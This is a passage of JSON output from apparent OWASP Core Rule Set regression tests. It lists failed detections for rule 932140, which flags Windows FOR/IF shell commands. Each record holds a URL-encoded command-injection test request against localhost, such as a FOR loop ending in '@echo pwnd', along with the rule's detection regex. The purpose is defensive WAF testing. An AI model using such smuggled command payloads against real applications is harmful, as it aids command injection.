        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 29,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 29,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%26+FOR+%2FF+%22tokens%3D1-3%22+%25A+IN+%28%22jejeje+brbr%22%29+DO+%40echo+pwnd",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 30,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 30,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%26+FOR+%2FF+%22tokens%3D1-3%22+%25%25A+IN+++%28%22jejeje+brbr%22%29+DO+%40echo+pwnd",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 31,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942511 - SQLi bypass attempt by ticks detected", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 31,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%26+FOR+%2FF+%22delims%3D%22+%25G+IN+%28%27SET%27%29+DO+%40Echo+%25G",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 32,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942511 - SQLi bypass attempt by ticks detected", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 32,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%26+FOR+%2FF+%22delims%3D%22+%25G+IN+++%28%27ECHO+foo%27%29DO+%40Echo+%25G",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 33,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
